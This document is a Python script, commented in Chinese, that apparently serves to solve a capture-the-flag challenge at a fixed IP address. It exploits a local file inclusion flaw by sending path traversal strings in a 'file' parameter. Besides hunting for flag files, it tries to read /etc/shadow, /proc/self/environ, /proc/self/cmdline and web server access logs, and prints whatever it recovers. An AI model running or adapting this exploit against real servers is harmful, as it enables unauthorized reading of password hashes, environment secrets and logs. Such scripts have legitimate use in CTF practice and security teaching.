#!/usr/bin/env python3
"""
LFI路径遍历扫描器
"""

import requests

target = "http://47.113.178.182:32826/"

# 常见flag位置
flag_locations = [
    "/flag",
    "/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/var/www/flag",
    "/var/www/flag.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "flag",
    "flag.txt",
    "../flag",
    "../flag.txt",
    "../../flag",
    "../../flag.txt",
    "../../../flag",
    "../../../flag.txt",
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../../flag",
    "../../../../../flag.txt",
]

# 敏感文件
sensitive_files = [
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "../../../../../../etc/shadow",
]

print("[*] 开始扫描flag文件...")
for path in flag_locations:
    try:
        r = requests.get(target, params={'file': path}, timeout=5)
        if 'flagTOGOGO{' in r.text:
            print(f"\n[+] 找到FLAG!")
            print(f"[+] 路径: {path}")
            # 提取flag
            import re
            flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                break
        elif 'No such file' not in r.text and 'failed to open' not in r.text and len(r.text) > 100:
            print(f"[?] 可疑路径: {path} (有内容返回)")
    except Exception as e:
        pass

print("\n[*] 尝试读取敏感文件...")
for path in sensitive_files:
    try:
        r = requests.get(target, params={'file': path}, timeout=5)
        if 'root:' in r.text or 'localhost' in r.text or len(r.text) > 200:
            print(f"[+] 可读取: {path}")
            if 'flag' in r.text.lower():
                print(f"    可能包含flag线索!")
                print(r.text[:500])
    except:
        pass
